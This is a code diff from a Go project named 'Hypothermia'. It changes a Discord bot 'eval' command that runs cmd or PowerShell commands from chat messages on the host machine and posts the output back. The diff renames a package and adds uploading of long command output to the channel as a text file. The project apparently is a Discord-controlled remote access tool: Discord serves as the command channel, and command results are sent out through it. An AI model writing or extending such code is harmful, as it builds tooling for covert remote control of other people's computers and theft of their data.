@@ -7,7 +7,7 @@ import (
 	"strings"
 	"syscall"
 
-	"Hypothermia/src/utils"
+	"Hypothermia/src/misc"
 	"github.com/bwmarrin/discordgo"
 )
 
@@ -32,11 +32,11 @@ func (*EvalCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args [
 	if args[0] == "?" {
 		var shortcuts string = "Shortcuts:\n\n"
 
-		for name := range utils.CmdShortcuts {
+		for name := range misc.CmdShortcuts {
 			shortcuts += name + "\n"
 		}
 
-		for name := range utils.PsShortcuts {
+		for name := range misc.PsShortcuts {
 			shortcuts += name + "\n"
 		}
 
@@ -47,10 +47,10 @@ func (*EvalCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args [
 	cmdName := ""
 	cmdArgs := &[]string{}
 
-	if val, ok := utils.CmdShortcuts[args[0]]; ok {
+	if val, ok := misc.CmdShortcuts[args[0]]; ok {
 		cmdName = "cmd"
 		*cmdArgs = []string{"/C", val}
-	} else if val, ok := utils.PsShortcuts[args[0]]; ok {
+	} else if val, ok := misc.PsShortcuts[args[0]]; ok {
 		cmdName = "powershell"
 		*cmdArgs = []string{"-Command", val}
 	} else if args[0] == "powershell" || args[0] == "ps" {
@@ -107,7 +107,18 @@ func (*EvalCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args [
 		response = evalNoOutput
 	}
 
-	s.ChannelMessageSendReply(m.ChannelID, response, m.Reference())
+	if len(response) > 1900 {
+		s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{
+			Reference: m.Reference(),
+			Files: []*discordgo.File{{
+				Name:        "output.txt",
+				ContentType: "text/plain",
+				Reader:      bytes.NewReader([]byte(response)),
+			}},
+		})
+	} else {
+		s.ChannelMessageSendReply(m.ChannelID, response, m.Reference())
+	}
 }
 
 func (*EvalCommand) Name() string {
